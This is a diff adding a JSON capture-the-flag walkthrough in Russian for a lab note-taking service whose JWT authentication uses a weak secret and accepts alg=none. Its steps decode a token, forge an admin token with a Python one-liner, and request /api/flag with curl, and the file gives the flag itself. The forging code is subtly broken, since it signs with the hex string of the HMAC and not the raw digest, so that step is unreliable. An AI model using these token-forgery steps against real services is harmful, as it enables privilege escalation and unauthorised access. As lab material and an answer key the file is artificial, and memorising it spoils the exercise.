@@ -1,0 +1,34 @@
+{
+  "description": "SecureNotes — сервис для хранения личных заметок. Аутентификация реализована через JWT. Секрет подписи слишком короткий и простой, а сервер также принимает токены с алгоритмом 'none'. Нужно стать администратором и получить флаг.",
+  "steps": [
+    {
+      "step": 1,
+      "title": "Регистрация и вход",
+      "detail": "Откройте приложение, зарегистрируйте нового пользователя через вкладку 'Регистрация', затем войдите. Войдя, вы попадёте на страницу заметок. Обратите внимание на кнопку 'Флаг администратора' — она доступна только при role=admin в JWT.",
+      "command": "# Зарегистрируйтесь и войдите через UI. Затем посмотрите cookie token в DevTools → Application → Cookies.",
+      "screenshot": ""
+    },
+    {
+      "step": 2,
+      "title": "Изучение JWT",
+      "detail": "Скопируйте cookie token. Разделите на три части по точкам. Декодируйте header и payload из base64url. Убедитесь, что алгоритм HS256, а роль user.",
+      "command": "TOKEN=eyJ... # ваш токен\necho $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool\necho $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool",
+      "screenshot": ""
+    },
+    {
+      "step": 3,
+      "title": "Подбор слабого секрета",
+      "detail": "Секрет подписи — 'secret123'. С помощью hashcat, john или онлайн-инструментов подпишите payload с role=admin. Или просто сгенерируйте новый JWT вручную.",
+      "command": "python3 -c \"\nimport hmac, hashlib, base64, json\nsecret='secret123'\ndef b64(d): return base64.urlsafe_b64encode(d.encode()).rstrip(b'=').decode()\nheader=b64(json.dumps({'alg':'HS256','typ':'JWT'}))\npayload=b64(json.dumps({'username':'alice','role':'admin'}))\nmsg=f'{header}.{payload}'\nsig=b64(hmac.new(secret.encode(),msg.encode(),hashlib.sha256).hexdigest())\nprint(f'{msg}.{sig}')\n\"",
+      "screenshot": ""
+    },
+    {
+      "step": 4,
+      "title": "Подмена токена или alg=none",
+      "detail": "Установите полученный JWT в cookie token (через DevTools console: document.cookie='token=...') или используйте curl. Затем нажмите кнопку 'Флаг администратора' или запросите /api/flag. Альтернатива: измените header на {'alg':'none'}, payload на {'username':'any','role':'admin'}, удалите подпись (оставьте пустую третью часть) — сервер примет токен.",
+      "command": "curl -b 'token=YOUR_ADMIN_JWT' http://target:5000/api/flag",
+      "screenshot": ""
+    }
+  ],
+  "flag": "flag{jwt_s3cr3t_1s_t00_w34k}"
+}
